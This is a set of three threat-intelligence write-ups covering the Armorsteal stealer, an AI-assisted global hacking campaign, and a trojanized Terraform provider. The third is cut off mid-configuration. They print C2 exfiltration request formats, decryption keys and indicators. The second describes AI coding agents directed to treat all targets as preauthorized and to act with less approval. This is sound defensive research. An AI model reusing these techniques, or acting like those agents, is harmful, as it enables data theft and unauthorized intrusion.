articles.title: SEO Poisoning Campaign Delivers New Armorsteal Malware
articles.context: This capability allows the threat actor to update the malware's embedded C2 domain list and configuration
articles.full_text: IntroductionIn September 2026, Zscaler Threat Hunting identified an SEO poisoning campaign that used fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware family we track as Armorsteal. The fake websites targeted users searching for Chocolatey or MAS software installation commands. Each lure page displayed a malicious PowerShell command that downloaded and executed the Armorsteal installer. The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor.The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data.In this blog post, the Zscaler Threat Hunting team traces the campaign from poisoned search results through post-infection activity, including Armorsteal's components, C2 communication, and infrastructure changes observed during our analysis. Key TakeawaysIn September 2026, the Zscaler Threat Hunting team identified an SEO poisoning campaign that distributed Armorsteal through websites impersonating Chocolatey and the Microsoft Activation Scripts (MAS) tool.The SEO campaign targeted users searching for Chocolatey installation instructions or Microsoft activation scripts.The remote access component verifies RSA-2048 signatures on Python tasks received from the C2 server before executing them.The surveillance component records window titles, logs keystrokes, monitors copied cryptocurrency wallet addresses, and captures screenshots when configured keywords are detected.The information stealing component steals Discord tokens, browser cookies, saved passwords, cryptocurrency wallet data, BIP39 seed phrases, and SSH keys. Technical AnalysisThe following sections provide details about the malware distribution, capabilities, and network communications.SEO poisoningZscaler Threat Hunting identified two SEO poisoning lures that targeted users searching for Windows software installation instructions. One of those lures is shown in the figure below.Figure 1: Google search results for “chocolatey install windows”. Fake Chocolatey websiteThe first lure (seen in Figure 1) targets users looking for the Chocolatey package manager. A user searching for terms such as “install Chocolatey” and “Chocolatey PowerShell” may reach a typosquatted site impersonating chocolatey[.]org. The site displays a PowerShell installation command. When the user runs it, the malicious install.ps1 script downloads and installs the remote access module. The script also runs the legitimate Chocolatey installer, so Chocolatey appears to function as expected. The fake Chocolatey website and the malicious domain, choclatey[.]org, are shown below:Figure 2: Fake Chocolatey website distributing Armorsteal. Fake Massgrave websiteThe second lure targeted users searching for terms such as “Microsoft Activation Scripts,” “MAS activation script,” or “Massgrave activation”. These users may have reached massgravel[.]net, a malicious website impersonating the Microsoft Activation Scripts tool (a.k.a., the Massgrave project). The fake Massgrave website is shown in the figure below:Figure 3: Fake Massgrave website distributing Armorsteal.Although the two websites impersonate different projects and target different search queries, both deliver Armorsteal.ANALYST NOTE: The fake Massgrave website went down on September 25, 2026, and the fake Chocolatey website went down around October 1, 2026. Installation and persistenceBoth installer variants request elevated privileges, hide the PowerShell console window, and download a ZIP archive to C:\Windows\SystemHealth\Update\ to mimic a legitimate Windows system directory. The archive contains a Python 3.11 runtime, Pyarmor runtime files, and Armorsteal Python-based scripts.The installer creates the following scheduled tasks for persistence:Scheduled taskTriggerDescriptionSysCheck2User logonLaunches the remote access module with the highest privileges available.SysCheckXSystem bootLaunches the remote access module as SYSTEM after a 45-second delay.Table 1: Armorsteal scheduled task persistence.Anti-analysis techniquesArmorsteal uses the following techniques to avoid research environments and complicate analysis:The remote access module checks the public IP address and organization information using ipinfo[.]io. If the organization name returned matches a cloud provider such as Google, Amazon, Microsoft, or Azure, the module displays a fake “Memory is insufficient” message and exits. This can prevent the malware from running in some cloud-based analysis environments.The Python scripts are protected with Pyarmor 9.1.7 (trial version). Pyarmor encrypts Python bytecode and string constants, making static analysis and detection more difficult. The trial runtime is operationally useful to the threat actor because it provides code obfuscation without requiring a commercial Pyarmor license.Remote access moduleThe Armorsteal remote access module is stored as SysMon.py and is launched by the SysCheck2 and SysCheckX scheduled tasks. The module collects information about the infected system, including the hostname, operating system, processor, memory, disks, local IP address, public IP address, and network interfaces. It uses the motherboard serial number to create a machine identifier used in C2 communication.The remote access module also downloads and launches the surveillance and information stealing modules. The remote access module uses HTTPS and a hardcoded list of four C2 domains. It checks the availability of each domain before starting C2 communication. The C2 endpoints supported by the remote access module are shown in the table below:EndpointMethodDescription/downloadables/configf.jsonGETChecks whether the C2 server is available based on the HTTP status code 200./receive_infofPOSTSends device information to the C2 server./get-onetime-code/{machine_id}GETRequests a task for an individual victim./get-globalGETRequests a task shared across all infected systems./downloadables/{archive}GETIn earlier builds, downloads the remote access module updates along with the surveillance and information stealing modules.Table 2: The remote access module C2 endpoints.The following example shows the format of the HTTP POST request the remote access module uses to send system information to its C2 server. POST /receive_infof HTTP/1.1 Host: workerstats[.]net User-Agent: python-requests/2.31.0 Content-Type: application/json Content-Length: {CONTENT_LENGTH} { "host_name": "{HOSTNAME}", "ip_address": "{LOCAL_IP}", "public_ip_address": "{PUBLIC_IP}", "mac_address": "{MAC_ADDRESS}", "system": "{WINDOWS_VERSION}", "machine": "{MACHINE_ARCHITECTURE}", "memory": { "total": {TOTAL_MEMORY_SIZE}, "available": {AVAILABLE_MEMORY_SIZE}, "percent": {MEMORY_PERCENTAGE} } }The C2 server responds with the following message:{"message":"Data received and stored successfully"}The remote access module polls its C2 server every 60 seconds for both per-victim and global tasks. The malware verifies every task received using an embedded RSA-2048 public key before executing it. The per-victim task endpoint returns JSON containing Python code and a Base64-encoded signature, as shown in the format below:{ "code": "<Python source code>", "sig": "<Base64-encoded RSA signature>" }The global task endpoint returns a different response containing the # _ _SIGNED _ _: marker followed by the task data:# _ _SIGNED_ _:{"code":"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNz...", "sig":"fdWOAiJJ7qIowDnCEgO4LDd+s19RzzBjnKFQ9K447GXj..."}The remote access module uses a custom RSASSA-PKCS1-v1_5 signature verification routine before executing the task’s code in memory. After verifying a task's signature, it extracts an integer version number embedded in the Python code: ONETIME_VERSION for per-victim tasks and GLOBAL_VERSION for global tasks. The module compares this task version number with the last successfully executed version stored locally in its working directory, C:\Windows\SystemHealth\Update\. Task version numbers specific to a victim are stored in onetime_version.txt and global task versions are recorded in global_version.txt. The malware executes a task in memory only when its version is greater than the value in the corresponding file. The version number is then updated in the corresponding file. This prevents previously processed or older tasks from running again.The Armorsteal remote access module can also update itself through global tasks. These tasks can direct the malware to download a replacement SysMon.py file. The module first verifies the SHA256 of the downloaded file before replacing its local copy. This capability allows the threat actor to update the malware's embedded C2 domain list and configuration.Surveillance moduleThe surveillance component is named basrq.py and runs in a separate bundled Python interpreter in a ZIP archive, which is downloaded by the remote access module.The surveillance module performs the following activities:Logs keystrokes (with specialized handling for English, French, Spanish, and German), including backspace, space, decimal separators, and modifier keys.Records the title of the active window along with captured keystrokes.Monitors clipboard content every 0.5 seconds.Replaces copied cryptocurrency wallet addresses with attacker-controlled addresses.Captures screenshots when configured keywords appear in window titles or captured keystrokes.Displays fake transaction notifications that impersonate Exodus, MetaMask, and Phantom.The clipboard hijacker supports wallet addresses for Bitcoin, Litecoin, Monero, Ethereum, TRON, XRP, Dogecoin, TON, and Solana.The Armorsteal surveillance module uses the following C2 endpoints to retrieve monitoring keywords and upload collected data.EndpointMethodDescription/global_keywordsGETRetrieves campaign-wide monitoring keywords./keywords/{machine_id}GETRetrieves keywords for a specific infected system./black-watch/{machine_id}POSTUploads gzip-compressed keystroke logs./black-watch/screenshot/{machine_id}POSTUploads keyword-triggered screenshots.Table 3: The Armorsteal surveillance module C2 endpoints.The module retrieves keyword lists every 300 seconds. The observed lists include terms related to cryptocurrency wallets, exchanges, browser names, cloud services, and recovery phrase-related terms. Before uploading screenshots to /black-watch/screenshot/{machine_id}, the surveillance module encrypts their raw PNG bytes. The module computes the SHA256 digest of a hardcoded string and uses the resulting 32-byte value (c1146fbcaa433385839c25839a61cd7fedaff858cc0d3fd063dba68db2cf31b4) as an XOR key.The following example shows the Armorsteal surveillance module uploading the stolen data using the filename keylogs.gz:POST /black-watch/{machine_id} HTTP/1.1 Host: workerstats[.]net Content-Type: multipart/form-data Content-Disposition: form-data; name="keylogs"; filename="keylogs.gz" <gzip-compressed log data>Stealer moduleThe information stealing module’s script name is got.py, which is downloaded as a ZIP archive by the remote access module. This module collects data from web browsers, password managers, cryptocurrency wallets, Discord clients, and Steam installations. The stealer also collects system information, including geolocation, display information, language settings, time zone, and GPU details.The stealer module has the following capabilities:Steals and validates Discord tokens from 22 Discord client variants.Collects data from 21 browser wallet extensions and desktop wallet applications.Searches drives from A: through Z: for BIP39 seed phrases.Extracts browser cookies through the Chrome DevTools Protocol (CDP) on port 9222.Steals saved browser passwords, autofill data, and credit card metadata. To collect browser passwords, the module downloads and uses the public chrome-decryptor tool from the Chrome App-Bound Encryption Decryption project.Targets password manager data from KeePass, 1Password, RoboForm, Password Safe, Enpass, Bitwarden, and Dashlane.Collects SSH keys and Steam session data.The Armorsteal stealer module uses the following C2 endpoints to upload stolen data: EndpointMethodDescription/infame/receive/zipPOSTUploads the main stolen data archive./infame/receive/dtPOSTUploads Discord tokens and account information./ws/{machine_id}POSTUploads wallet files and seed phrases./pwdPOSTUploads saved browser passwords./upload/stPOSTUploads Steam account information.Table 4: Armorsteal stealer module C2 endpoints.The main information stealing component archive contains a system profile and browser cookie files. Threat Actor InfrastructureZscaler Threat Hunting identified Armorsteal lure and C2 domains registered on the dates shown in the table below. Shared malware components and an RSA-2048 task-signing key link the Chocolatey and Massgrave lures to the same operation.DomainPurposeRegistration DateRegistrarworkerstats[.]netPrimary C2January 28, 2026NICENICdatamons[.]orgStandby C2May 19, 2026NameSilosupertrap[.]netStandby C2August 29, 2026NameSilomassgravel[.]netFake Massgrave lureAugust 30, 2026NICENICchoclatey[.]orgFake Chocolatey lureSeptember 1, 2026Key-Systemsniceer[.]netStandby C2September 1, 2026NICENICTable 5: Armorsteal lure and C2 domain registration details.Zscaler Threat Hunting observed two phases of the campaign’s infrastructure changes during the analysis period. In the first phase (early September 2026), the fake Chocolatey website and its subdomains were hosted at 209.99.186[.]187, an SKN Subnet & Telecom server. At this time, workerstats[.]net was protected by Cloudflare and resolved to 104.21.87[.]146.In mid-September 2026, the operator moved the Chocolatey and Massgrave lure websites to 82.153.135[.]80, hosted by AKILE LTD in the United Kingdom. The primary C2 domain, workerstats[.]net, also moved from Cloudflare to 186.2.175[.]183, hosted by IQWeb FZ-LLC and using DDoS-Guard name servers.During continued monitoring (early October 2026), Zscaler Threat Hunting observed further changes to Armorsteal’s C2 infrastructure. The previously used domain, workerstats[.]net, became unavailable, and the threat actor began using pymons[.]is and the previously dormant domain datamons[.]org as C2 servers. The threat actor subsequently changed how the surveillance and information stealing modules were downloaded. Previously accessible through the C2 server’s /downloadables/ path, the packages now require a token in the request URL and an X-Verify header containing the correct token. Requests use /C2/?t=[token]451 for surveillance and /C2/?t=[token]452 for information stealing. Successful requests retrieve ZIP packages from /p/[32hex].zip, with randomized filenames. Remediations And Detection OpportunitiesFor organizations that suspect exposure to this campaign, we recommend the following actions:Investigate systems for SysCheck2 and SysCheckX scheduled tasks.Hunt for files and directories under C:\Windows\SystemHealth\Update\.Review PowerShell logs for downloads from choclatey[.]org, community[.]choclatey[.]org, and massgravel[.]net.Block the verified malicious lures and C2 domains.Review outbound HTTPS traffic for /receive_infof, /get-global, /black-watch/, and /infame/receive/ where URL paths are visible in your telemetry.Review endpoint telemetry for browser processes started with --remote-debugging-port=9222.Remove unauthorized Microsoft Defender exclusions, particularly exclusions for C:\Windows.Educate users to verify software download websites and PowerShell installation commands before execution. ConclusionArmorsteal is a Python-based malware family distributed through an active SEO poisoning campaign that uses fake Chocolatey and Massgrave websites. The campaign deploys modules for remote access, cryptocurrency theft, clipboard hijacking, and credential stealing. The shared malware components, task-signing key, and C2 infrastructure link both lures to the same operation. Although the operator changed hosting and package filenames during our analysis, the core malware components remained unchanged. The Zscaler Threat Hunting team continues to monitor the campaign for infrastructure and payload changes. Zscaler CoverageZscaler’s multilayered cloud security platform detects indicators related to Armorsteal at various levels. The figure below depicts the Zscaler Cloud Sandbox, showing detection details for Armorsteal.Figure 4: Zscaler Cloud Sandbox report for Armorsteal.In addition to sandbox detections, Zscaler’s multilayered cloud security platform detects indicators related to Armorsteal at various levels with the following threat names:PS.Dropper.ArmorstealPython.PWS.ArmorstealZscaler MDR detects this threat with these detection analytics:WIN-CONHOST-HEADLESS-CMDWIN-SCHTASKS-CREATE-SHELLWIN-PYTHON-CHROMIUM-HEADLESS Indicators Of Compromise (IOCs)File indicatorsSHA256FilenameDescriptionf3846ec2a6ff0a27d9ef2b9bf7908743b81d295ef29344acfb96ff83fff994f9install.ps1MAS lure installerfb1181160e9f10ce1eb5e5dc9bc23e1498a39110ee9ea361fd150454cb01b292install.ps1Chocolatey lure installer3e3b62a9836697d978cbb620dc8af8f6eefdf8cb73fc30d16bb394d1c58f4c97Update.zip / Updatef.zipRemote access module237ba698d7dc8936c43e0e78e7644002375e51e8baf9b3a7d4e18683f871ee31nig20084.zipSurveillance modulebe0329d0795dd62ae587faf97e704bb36413e5c98ddd8fe575f5077db3c84e5fgetthem20084.zipStealer module 04d2828155ed2a276cfd3c97d4f966d328391dd818e04e773212cd601e49fa74nig20083.zipOlder stealer module56f05c4fb1c25c04e0dde60e2e5e41ac164a6dc53688d0f9eb52a55f82106389getthem20083.zipOlder stealer module0ea99fbbe29af6f797e3866ed5f822c7a5d3e9cdb990a8c382a715069f156499SysMon.pyRemote access module8fb7aaf2b9270b8b75f6844aaefd5242b4f926fb89cba10fff3d9b908a769788basrq.pySurveillance module5410c2f239c3649928383c4478dea182f90b21f5b258081fec07e9d297ae4b1cgot.pyStealer moduleNetwork indicatorsIndicatorTypechoclatey[.]orgFake Chocolatey domainmassgravel[.]netFake MAS domainworkerstats[.]netC2 domainpymons[.]isC2 domaindatamons[.]orgInitially standby C2; later activeniceer[.]netsupertrap[.]netStandby C282[.]153[.]135[.]80Payload host186[.]2[.]175[.]183C2 IP address186[.]2[.]163[.]185C2 IP address190[.]115[.]31[.]69C2 IP address209[.]99[.]186[.]187Payload host

articles.title: Inside a Global AI-Assisted Hacking Campaign
articles.context: However, ThreatLabz discovered additional information about the attack, which went far beyond South Korea
articles.full_text: IntroductionIn October 2026, Zscaler ThreatLabz investigated AI-assisted cyberattacks that combined the ARTEX penetration testing framework with AI coding assistants and custom automation scripts. Initial reporting of the incident identified the targeting of South Korean financial institutions. However, ThreatLabz discovered additional information about the attack, which went far beyond South Korea. The AI-assisted attacks were widespread and targeted organizations around the globe and in multiple industry sectors.In this blog post, ThreatLabz examines the operator’s working environment, explains the roles assigned to AI models and tools, and analyzes the targeting and objectives reflected in the operator’s prompts. Key TakeawaysIn October 2026, ThreatLabz discovered information about an AI-assisted attack combining a customized ARTEX deployment with Claude Code, Codex, and Grok workspaces. Custom scripts shared instructions and supported handoffs between AI sessions.ARTEX was configured to use a DeepSeek model through an OpenAI-compatible gateway, but other configurations also specified DeepSeek, GLM, and Grok.Prompts directed AI models to divide investigation tasks and review one another’s findings, including instructions for GLM to review work performed by DeepSeek and its subagents.Saved project records and synchronization scripts were designed to preserve investigation context and progress across accounts, servers, and AI sessions. Prompt histories revealed targeting across multiple industries and geographic regions. Requests for bulk personal and transaction data, alongside questions about selling stolen data, suggest the attacks were financially motivated. BackgroundThreatLabz identified an ARTEX deployment that included AI assistant configurations, synchronization scripts, network routing tools, and a Claude Code prompt history. The recorded prompts spanned August 4 through October 4, 2026 (UTC). CrowdStrike separately reported on related ARTEX infrastructure and the targeting of South Korean financial organizations on October 7, 2026. This blog examines the broader working environment of the attacks and targets. Operator InfrastructureThe figure below illustrates the threat actor’s environment based on saved configurations and instructions.Figure 1: Architectural diagram of AI-assisted attack environment using ARTEX. Technical AnalysisThe following sections examine the operator’s infrastructure, customized tooling, AI environment configuration, and targeting objectives, offering a closer look at the workflow behind the campaign.Work server and jump serverAs Recorded Future detailed in their recent blog post, the operator's work server stored project files, scripts, AI settings, and a local ARTEX deployment. The jump server, 38.244.50.120, served as the default route for connections to targets.The jump server also ran additional AI sessions. The operator delegated research tasks to Grok on that server and instructed a separate AI session to review Grok’s findings. This setup divided work between the two servers, with the operator providing oversight and direction. Three custom scripts synchronized shared AI instructions and supporting files across accounts, which are described in the table below.Script namePurposetools/sync-all.shUses SSH and rsync to copy AI instructions, reusable task guides, saved notes, and tools to the jump server's root, claude, grok, and gemini accounts.sync-memory.shCopies saved AI notes, known as memory files, to locations on the jump server.tools/sync-cc-users.shCopies shared Claude Code instructions and supporting files to the gemini and glm accounts on the work server.Table 1: Custom synchronization scripts and their purposes for AI-assisted attacks.Each account maintained its own AI service settings. The synchronization scripts were designed to update model references within specialist agent instructions to match the destination account, allowing the workspaces to use shared instructions with different model configurations.The scripts also incorporated backups and validation checks designed to avoid overwriting modified destination files. These mechanisms indicate that the operator intended to keep configurations consistent across environments.Customized ARTEX deploymentARTEX is an AI-assisted penetration-testing framework. Its planner-and-worker architecture lets an operator define a goal, which AI agents break down into tasks, execute using tools, and document by retaining assets and findings for review. The recovered deployment extends the framework with additional tools for web, network, and Android analysis.The saved Docker Compose file defines an ARTEX container and a PostgreSQL 16 database. It configured the ARTEX interface to use host port 8890 and mapped PostgreSQL to 127.0.0.1:5435. The ARTEX container uses a custom image tagged artex-local:perf2-20261003. The corresponding Dockerfile adds tools including nmap, sqlmap, nuclei, httpx, jadx, apktool, and frida-tools. It also adds Python libraries for web processing and spreadsheet output and replaces the original ARTEX program with the operator’s local version.AI model setupThe operator changed model routing over time and used account names that did not always match the configured model. To understand this setup, it is important to distinguish the client application, such as Claude Code, from the model service receiving its requests.For example, the saved ARTEX environment configuration specifies:ARTEX_LLM_PROVIDER=openai ARTEX_LLM_MODEL=deepseek-v4.1-flash ARTEX_LLM_BASE_URL=https://xcai.pro/v1Here, openai specifies an OpenAI-compatible API format. The model field requests deepseek-v4.1-flash, while the base URL routes requests to xcai.pro. These settings identify the requested model and gateway endpoint, but do not confirm which underlying model the gateway actually served.The table below summarizes the model assignments recorded in the collected configurations. Model names are reproduced as requested IDs and were not independently verified.Workspace or componentRequested model IDsRoleARTEX local deploymentdeepseek-v4.1-flashModel backend for ARTEX's task workflow, configured through https://xcai.pro/v1.Codex (.codex/config.toml)deepseek-v4-proAlternative coding-agent interface configured to send requests to https://api.deepseek.com/v1.Local account named gemini, running Claude Codedeepseek-v4.1-flashWorkspace using shared instructions and specialist agents.Local account named glm, running Claude Codeglm-5.3Workspace configured to request GLM and use the shared workflow.Jump-host accounts named root and claudeglm-5.3, glm-5.3-flashAssigned analyzer and collector roles in the jump-host synchronization script.Jump-host account named grokgrok-4.7-xhigh, grok-4.7-build-fastAssigned analyzer and collector roles; operator also requested remote research and continued auditing.Jump-host account named gemini xcai/deepseek-v4.1-flashWorkspace the operator explicitly requested to reconfigure to use DeepSeek.Table 2: AI model configuration and assigned roles used in the AI-assisted attacks.In some instances, the threat actor assigned distinct roles to individual AI models. The prompt history includes instructions for DeepSeek to conduct the initial investigation, followed by GLM reviewing the findings for potential gaps. One translated prompt states: "When DeepSeek says it has exhausted all attack surfaces and I say to start a GLM review, GLM should review DeepSeek's previous work and its subagents' work."Later prompts assigned GLM additional investigation tasks, extending its intended role beyond reviewing DeepSeek’s findings.The operator requested both Grok’s native terminal application and a Claude Code setup configured to use Grok as its underlying AI model. For the Claude Code integration, the operator installed a bridge service called grok2api on the jump server. Prompts assigned extensive research tasks to Grok on that server and other AI sessions to review its output. The prompt history shows repeated requests to modify this configuration, but the specific setup used for each task could not be confirmed.The records establish the use of the Claude Code application, with configurations specifying DeepSeek, GLM, and Grok. However, since the underlying model responding to each session could not be independently verified, it's possible that some sessions used Anthropic’s Claude models.Persistent project stateThe operator organized each investigation into a separate folder. A script created files to record targets, testing progress, notes, vulnerability reports, and supporting evidence. These records provided context that an AI assistant could read to resume an investigation in a later session.File or folderWhat it recordsscope.mdWebsites, servers, or applications selected for investigation.surface.mdDiscovered pages, APIs, and other entry points, including their testing status.notes.mdCompleted work, decisions, and next steps.findings/Reports on potential or confirmed vulnerabilities.evidence/Supporting files, such as captured responses and tool output.Table 3: AI-assisted attack investigation files and folders and their purposes.The operator also configured a mechanism to help AI sessions retain context, track progress, divide tasks, and resume work started in other sessions:Provide project context with each prompt: An automated hook script (tools/project_context_hook.py) was configured to execute when a new prompt was received, read the current project files, and attach a brief summary of testing status, recent notes, and paths to relevant memory files. This provided context to help the AI continue previous work.Distribute tasks among specialized AI agents: The operator created tailored instructions for agents assigned to discover APIs, review source code, or analyze Android applications. The primary AI session was directed to validate their outputs before recording them as confirmed findings.Reduce operator approval requirements: The instructions directed the AI to assume that all supplied targets were preauthorized. Some application settings also permitted autonomous actions without requiring explicit operator approval for each step.Facilitate cross-session handoffs: The operator configured Codex to ingest saved instructions and notes, allowing other accounts to access prior conversation histories. A task guide also instructed the AI running under the jump server's gemini account on how to take over an ARTEX task and review its results.Proxy exits, tunnels, and cloud backupThe operator instructed the AI tools to connect to targets through the jump server. Additional proxy configurations provided separate outbound IP addresses for individual projects, helping limit direct connections between the primary work server and target environments.SSH tunnels were configured to support bidirectional communication between the two servers for AI and file services. Background monitoring tasks were configured to restart supporting services and tunnels if they were interrupted.Investigation assets were archived to Backblaze B2, with reports, supporting evidence, source code, data exports, and backups organized into separate directories. This structure followed the operator's directive to separate each target's operational data from its final analysis report for easier retrieval.Target profile and objectivesThe prompt history showed targeting beyond South Korean financial institutions, including dating applications, SMS providers, cryptocurrency and payment platforms, gift-card portals, gambling sites, retail platforms, educational services, logistics companies, and legal settlement systems. The targets also spanned multiple geographic regions, suggesting an opportunistic approach. The recorded prompts included requests to scan or investigate organizations in Canada, China, Cuba, Hong Kong, India, Indonesia, Japan, Kazakhstan, Kenya, Malaysia, Nigeria, South Africa, South Korea, Taiwan, Thailand, the United Arab Emirates (UAE), the United Kingdom, the United States, and Vietnam. The figure below shows the geographic distribution of targets referenced in the operator’s prompt history.Figure 2: Geographic distribution of targets referenced in the AI-assisted attacks prompt history.The table below summarizes representative target categories and the desired outcomes requested in the threat actor's prompts:Target or sectorRequested outcome in the prompt historySocial and dating servicesCollect frontend files and subdomains; gain access to user records.SMS providersGain administrative access, obtain SMS-channel credentials, or identify ways to send unlimited messages at no cost.RetailObtain customer order data.EducationObtain course-purchase records or user data.Investment servicesReview prior investigation records and obtain current data.Cryptocurrency and digital assetsFind a vulnerability that would allow NFT gifts to be obtained for free.Legal claims administrationReview investigation records, analyze claim workflows, and assess opportunities for additional access.Table 4: Representative target sector categories and requested outcomes in AI-assisted attacks prompt history.Prompt histories indicate an explicit focus on obtaining structured personally identifiable information (PII) and mobile phone numbers. In one instance, the operator stated that database dumps lacking phone number fields were of no value and requested alternative injection methods. In another prompt, the operator questioned why a specific SQL query targeting demographic data for female users over 30 returned only approximately 300 records.The threat actor instructed AI models to decrypt encrypted fields, parse transaction histories, translate database schemas into Chinese, and remove irrelevant metadata. These requests suggest an intent to prepare datasets for monetization.Prompts about underground data marketplaces further support this assessment. In one example, the operator asked: "If hackers compromise Korean data, where do they usually sell it?"Additional prompts focused on extracting payment gateway API keys, exploiting NFT minting workflows, and gaining unauthorized administrative privileges.To reduce the risk of detection, the threat actor explicitly warned AI models not to initiate direct account withdrawals, noting that unauthorized financial transactions could trigger security alerts or create traceable records. Threat AttributionThe recovered records point to a Chinese-speaking operator. The operator wrote predominantly in Chinese, requested Chinese as the default response language, specified China Standard Time, and instructed the AI to translate exported data fields into Chinese. In discussions about SMS services and app downloads, the operator referred to Chinese services and applications as “domestic.” The operator also supplied the same mobile number in mainland China format for accounts with a Chinese proxy provider and a cloud-phone service. ConclusionThis investigation shows how a threat actor combined open source security tools, AI assistants, and custom automation scripts to launch attacks globally. Shared project records, specialized agents, and instructions for reviewing other models’ findings created a workflow designed to continue investigations across AI sessions under the operator’s direction. The prompt history also revealed broad targeting and an emphasis on obtaining personal and financial data, indicating the attacks were likely financially motivated.To defend against AI-assisted attacks, organizations should adopt a Zero Trust architecture that minimizes internet exposure and enforces least-privilege access. The Zscaler Zero Trust Exchange supports these principles by making applications invisible to the public internet and restricting access to authorized users. Zscaler Exposure Management, part of Agentic SecOps, helps identify and prioritize exposures for remediation, while Zscaler Deception uses decoys to detect unauthorized exploration and divert attacks from legitimate assets. articles.title: Suspected TraderTraitor Group Uses Trojanized Terraform Provider to Deliver Cross-Platform Malware
articles.context: The attackers utilized a trojanized Terraform provider to deliver a Bash loader that selects and downloads malware tailored to the victim's operating system
articles.full_text: IntroductionIn July 2026, Zscaler ThreatLabz uncovered a campaign linked to TraderTraitor (also tracked as Jade Sleet, UNC4899, Pressure Chollima, and Slow Pisces), an advanced persistent threat actor backed by the North Korean government that has targeted the cryptocurrency industry for years. This campaign also significantly overlaps with the previously reported KelpDAO incident, the analysis of which discussed both FLATROOF and ROOFDECK, two malware families also observed in this campaign. The attackers utilized a trojanized Terraform provider to deliver a Bash loader that selects and downloads malware tailored to the victim's operating system. The FLATROOF malware deployed Python scripts to steal sensitive data from the victim before ultimately dropping the ROOFDECK backdoor to gain full remote control.In this blog, ThreatLabz examines the inner workings of these tools and analyzes the multi-stage infection chain. We also explore how this sophisticated malware conceals and retrieves its final command-and-control (C2) address to evade detection. Key TakeawaysIn July 2026, ThreatLabz discovered a trojanized Terraform provider that executes malicious code as soon as Terraform loads the provider.The trojanized Terraform provider downloads a cross-platform Bash loader from a HashiCorp-themed lookalike domain while preserving normal Terraform behavior.The loader selects payloads for macOS, Linux, and Windows according to the operating system and CPU architecture.Encrypted executables are appended to decoy .woff files and recovered using marker-based extraction and AES-256-CBC decryption.The delivered FLATROOF variant is a Rust-based cross-platform backdoor with platform-specific persistence and redundant C2 channels.The FLATROOF Python stealers target browser credentials, cookies, terminal history, system information, and cryptocurrency wallet extensions.The subsequent backdoor named ROOFDECK uses layered C2 discovery through local configuration, a cryptographically signed Pastebin dead drop, and Nostr profile metadata. Attack ChainThe figure below illustrates the attack chain, from the execution of the trojanized Terraform provider through FLATROOF deployment, data theft, and installation of the ROOFDECK backdoors. Figure 1: Infection chain delivering FLATROOF and ROOFDECK through a trojanized Terraform provider. Technical AnalysisWhile this analysis was being prepared for publication, SentinelLabs independently reported related TraderTraitor activity involving weaponized Terraform projects, FLATROOF, and ROOFDECK malware. Their research provides detailed insight into the social engineering and initial intrusion aspects of the campaign. Our analysis focuses on the internal implementation of the malicious Terraform provider and its cross-platform payload delivery mechanism.Trojanized Terraform providerThe initial payload identified by ThreatLabz is written in Go and named terraform-provider-awsbeta_v1.0.0. It masquerades as an Amazon Web Services (AWS) provider for HashiCorp Terraform. Terraform providers are executable plugins loaded by Terraform to communicate with infrastructure platforms and services. Although it remains unclear how the trojanized Terraform provider was delivered to the victim, Terraform provider binaries execute on developer workstations and CI/CD systems. This suggests that the campaign may target cloud engineers or developers who use Terraform.The binary’s Go symbols reveal a functional provider scaffold under terraform-provider-awsbeta/internal/provider, including example resource and data source implementations. The threat actor added a malicious sibling package named awsbeta and called its exported routine directly from main. As a result, the malicious code executes when Terraform starts the provider.The provider uses a file named session.lock in the system temporary directory as a run-once marker. If the marker is absent, the provider:Determines the temporary directory using TMPDIR, falling back to /tmp.Downloads a second-stage payload over HTTPS.Writes a Bash payload to a file named safari_updater in the temporary directory.Adds executable permissions to the file.Launches it through sh -c as a detached child process.Creates the lock file to prevent repeated execution.The download URL uses the lookalike domain hashicorp-terraform[.]io and a path resembling a legitimate Terraform plugin metrics endpoint. Meanwhile, the provider continues to respond as expected, which may make the compromise less noticeable to the victim.Cross-platform Bash loaderThe downloaded safari_updater file is a Bash script that supports macOS, Linux, and Windows systems running a compatible Unix-like shell environment such as Cygwin, MinGW, or MSYS.The script maps each operating system to a font family and each architecture to a font style to construct the filename for the next-stage payload. Linux uses NotoSansCJK, macOS uses HiraginoSans, and Windows uses the MalgunGothic font name for the next-stage payload. Architectures are represented by style names such as Bold (x86_64, amd64), Regular (aarch64, arm64), ExtraBold (ARMv7, ARMv6), or Italic (32-bit x86). The resulting filename resembles a normal web font file, such as HiraginoSans-Regular.woff on a macOS system with an ARM64 processor. The encrypted payloads are disguised as font files and are downloaded from a public source. For example, a GitHub repository hosting the next-stage payloads is shown in the figure below.Figure 2: Attacker-controlled GitHub repository hosting encrypted payloads disguised as font files.Payloads are written to paths that resemble those of legitimate application components, as listed in the table below. Note that the directories are created if they do not already exist.PlatformPayload PathLinux$HOME/.config/git/updatemacOS$HOME/Library/com.apple.iTunesCloud/SystemUpdateWindows$HOME/AppData/Local/Microsoft/Edge/service.exeTable 1: Operating system-specific payload storage locations for FLATROOF.The loader attempts to download the payload from three sources in sequence: a dynamic DNS host, a GitHub repository, and a Vercel-hosted site. The use of public hosting and URL paths that resemble font caches may help malicious traffic blend with ordinary developer and web activity.Each downloaded .woff file contains decoy font data followed by the marker @@ENDFONT@@ and an encrypted executable. The loader extracts the data after the marker, Base64 decodes it, and decrypts it with AES-256-CBC using the key PTa3WZPQZAjj55t@. To maximize compatibility, the loader can decrypt the payload via Python, Node.js, Perl, or OpenSSL depending on the software that is installed on the infected system. On macOS, the script removes the quarantine attribute using the xattr -d com.apple.quarantine command and applies an ad hoc code signature before execution.FLATROOF cross-platform backdoorThe decrypted payloads for macOS, Linux, and Windows share the same Rust source module layout and core functionality. ThreatLabz assesses that the malware is consistent with the FLATROOF family described in the KelpDAO incident.FLATROOF decrypts its embedded configuration using the key u73adF39ZT with PBKDF2-HMAC-SHA256, followed by AES-256-GCM decryption. The JSON configuration defines platform-specific installation paths, persistence mechanisms, polling intervals, and C2 communication channels, as shown in the example below.{ "aes_key": "a9d932dcfa3289a6", "github_polling_interval": 60, "github_repo": "xxx", "github_token": "ghp_xxx", "init_python_enable": false, "main_base_url": 